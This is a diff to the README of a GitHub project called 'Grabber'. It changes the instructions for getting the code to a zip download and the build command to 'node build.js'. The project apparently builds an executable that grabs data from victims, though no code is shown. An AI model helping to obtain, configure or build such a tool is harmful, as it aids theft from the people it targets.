@@ -49,12 +49,7 @@ To use and build this grabber, you'll need to download these things:
 
 ### Getting the code
 
-You can:
-* [download zip](https://github.com/JustYuuto/Grabber/archive/refs/heads/master.zip)
-* or use git:
-  ```bash
-  git clone https://github.com/JustYuuto/Grabber.git
-  ```
+[Download zip](https://github.com/JustYuuto/Grabber/archive/refs/heads/master.zip) and extract it.
 
 ### Configuration
 
@@ -65,9 +60,7 @@ Some things need to be configured (in the [`config.js`](config.js) file) before 
 After configuring the grabber, we can finally build its executable! Run the following command in the project folder:
 
 ```bash
-npm run build
-# or with yarn
-yarn build
+node build.js
 ```
 
 **What is going on after running the command**:
